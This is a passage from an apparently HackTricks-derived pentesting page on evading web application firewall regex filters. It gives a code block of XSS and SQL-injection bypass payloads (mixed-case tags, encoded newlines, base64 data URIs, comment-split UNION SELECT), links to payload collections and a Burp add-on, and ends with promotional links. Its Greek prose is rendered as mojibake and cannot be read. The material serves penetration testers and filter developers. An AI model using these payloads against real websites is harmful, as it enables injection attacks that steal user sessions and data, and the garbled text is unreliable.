Î”Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸Î¿ÏÎ½ Ï„Î± Ï†Î¯Î»Ï„ÏÎ± regex ÏƒÏ„Î± Ï„ÎµÎ¯Ï‡Î· Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚. Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ ÎµÎ½Î±Î»Î»Î±Î³Î® Ï€ÎµÎ¶ÏÎ½-ÎºÎµÏ†Î±Î»Î±Î¯Ï‰Î½, Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î´Î¹Î±ÎºÎ¿Ï€ÏÎ½ Î³ÏÎ±Î¼Î¼Î®Ï‚ ÎºÎ±Î¹ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï†Î¿ÏÏ„Î¯Ï‰Î½. Î ÏŒÏÎ¿Î¹ Î³Î¹Î± Ï„Î¹Ï‚ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) ÎºÎ±Î¹ [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). Î¤Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€ÏÎ¿Î®Î»Î¸Î±Î½ Î±Ï€ÏŒ [Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Tools

* [**nowafpls**](https://github.com/assetnote/nowafpls): Î ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Burp Î³Î¹Î± Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î¬Ï‡ÏÎ·ÏƒÏ„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÎµ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï„Ï‰Î½ WAFs Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¿ Î¼Î®ÎºÎ¿Ï‚

## References

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
